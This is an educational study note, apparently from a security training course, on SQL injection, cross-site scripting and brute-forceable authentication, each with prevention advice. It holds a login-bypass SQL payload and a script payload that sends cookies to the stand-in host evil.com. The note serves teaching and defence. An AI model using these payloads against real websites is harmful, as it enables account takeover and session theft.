# Web Vulnerabilities — Cracks in the Ice
**Operation IceBreaker | Day 5 | K. Ponn Nidharshna**

## 1. SQL Injection (SQLi)

### How it works
SQL Injection happens when an attacker inserts malicious 
SQL code into an input field (like a login form). The 
database executes it as a real command, allowing the 
attacker to bypass login, steal data, or delete records.

### Example
Normal login query:
SELECT * FROM users WHERE username='admin' AND password='1234'

Attacker enters in username field:
admin' OR '1'='1

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1'
This returns all users — login bypassed!

### How to prevent it
- Use parameterized queries / prepared statements
- Never directly insert user input into SQL queries
- Use input validation and sanitization

---

## 2. Cross-Site Scripting (XSS)

### How it works
XSS happens when an attacker injects malicious JavaScript 
into a trusted website. When other users visit that page, 
the script runs in their browser — stealing cookies, 
redirecting them, or capturing keystrokes.

### Example
Attacker posts this in a comment section:
<script>document.location='http://evil.com?cookie='+document.cookie</script>

Every user who views that comment gets their 
session cookie stolen!

### How to prevent it
- Sanitize and encode all user input before displaying
- Use Content Security Policy (CSP) headers
- Never trust data coming from users

---

## 3. Broken Authentication

### How it works
Broken authentication happens when login systems are 
poorly implemented — allowing attackers to compromise 
passwords, session tokens, or credentials to assume 
other users' identities.

### Common causes
- Weak or default passwords allowed
- No limit on login attempts (brute force possible)
- Session tokens not expiring after logout
- Credentials exposed in URLs

### Example
A website allows unlimited login attempts — attacker 
runs a brute force tool and tries millions of passwords 
until they get in.

### How to prevent it
- Enforce strong password policies
- Implement multi-factor authentication (MFA)
- Lock accounts after multiple failed attempts
- Expire session tokens properly after logout

 

